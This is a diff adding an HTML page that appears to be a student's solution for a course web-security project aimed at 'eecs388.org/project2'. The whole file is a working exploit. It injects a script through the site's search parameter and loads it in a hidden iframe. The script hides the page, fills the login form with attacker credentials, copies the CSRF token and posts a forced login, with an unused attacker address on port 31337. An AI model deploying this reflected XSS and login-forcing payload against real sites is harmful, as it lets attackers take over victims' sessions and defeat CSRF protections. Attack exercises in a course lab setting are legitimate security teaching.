@@ -1,0 +1,43 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+	function payload(attacker) {
+		function proxy(href) {
+			$("html").load(href, function(){
+				$("html").show();
+				$("input#username").val("attacker");
+				$("#userpass").val("l33th4x");
+				var user = $("input#username").val();
+				var pass = $("#userpass").val();
+				var token = $("input[name=csrf_token]").val();
+				$.ajax({
+					type: "POST",
+					url: "./login?csrfdefense=1&xssdefense=0",
+					data: { username: user, password: pass, csrf_token: token }
+				})		
+			});
+		}
+		$("html").hide();
+		proxy("./");
+	}
+	function makeLink(xssdefense, target, attacker) {
+		return target + "./search?csrfdefense=1&xssdefense=0&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() +
+			";payload(\"" + attacker + "\");</script" + ">");
+	}
+	var xssdefense = 0;
+	var target = "http://eecs388.org/project2/";
+	var attacker = "http://127.0.0.1:31337/";
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	var _iframe = $('<iframe />')
+		.attr('src', url)
+		.hide()
+		.appendTo('body');	
+});
+</script>
+
+
+
+
+
